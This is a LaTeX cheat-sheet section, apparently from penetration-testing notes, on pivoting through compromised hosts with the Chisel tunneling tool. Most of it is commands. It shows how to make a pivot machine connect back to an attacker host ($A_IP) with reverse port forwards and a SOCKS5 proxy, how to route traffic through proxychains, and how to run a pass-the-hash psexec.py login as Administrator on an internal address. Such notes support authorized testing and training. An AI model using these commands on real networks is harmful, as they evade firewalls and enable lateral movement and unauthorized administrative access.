

\section{Chisel pivoting}

\href{https://github.com/jpillora/chisel}{Chisel} is a TCP/UDP-based tunneling
tool that uses HTTP to transport data that is secured using SSH. Chisel can
create a client-server tunnel connection in a firewall restricted environment.

\url{https://ppn.snovvcrash.rocks/pentest/infrastructure/pivoting#chisel}
\url{https://ap3x.github.io/posts/pivoting-with-chisel/}

\subsection{Local port forwarding}


\subsubsection{Server on attacker}

for example in order to access an http server only on lacal host on port 8000

{\bf On attacker}:
\begin{verbatim}
/chisel server -p 9999 --reverse
\end{verbatim}

{\bf On pivot}:
\begin{verbatim}
chisel.exe client $A_IP:9999 R:5555:127.0.0.1:8000
\end{verbatim}

then 
\begin{verbatim}
curl  http://127.0.0.1:5555
\end{verbatim}

{\bf Multiple port forward}:
\begin{verbatim}
chisel.exe client $A_IP:9999 R:5555:127.0.0.1:8000 R:5556:127.0.0.1:8001
\end{verbatim}

\subsection{SOCKS5 tunneling}
\subsubsection{Server on pivot}
might need to manage firewall (allow incoming connexions) on the pivot
{\bf On pivot}:
\begin{verbatim}
./chisel server -v -p 1234 --socks5
\end{verbatim}

{\bf On attacker}:
\begin{verbatim}
./chisel client -v $P_IP:1234 socks
\end{verbatim}

edit \verb+/etc/proxychains.conf+ to happen \verb+ socks5   127.0.0.1:1080+

\subsubsection{Server on attacker(Reverse pivot)}
{\bf on the attacker}

\begin{verbatim}
chisel server -p 8001 --reverse --socks5
\end{verbatim}

edit \verb+/etc/proxychains.conf+ to happen \verb+ socks5   127.0.0.1:1080+

After client connexion:
\begin{verbatim}
proxychains4 psexec.py -hashes 00000000000000000000000000000000:27dedb1dab4d8545c6e1c66fba077da0 Administrator@172.16.6.3
\end{verbatim}

{\bf on the pivot}

\begin{verbatim}
create a reverse proxy and open port 1080 on attacker
chisel client $A_IP:8001 R:socks
\end{verbatim}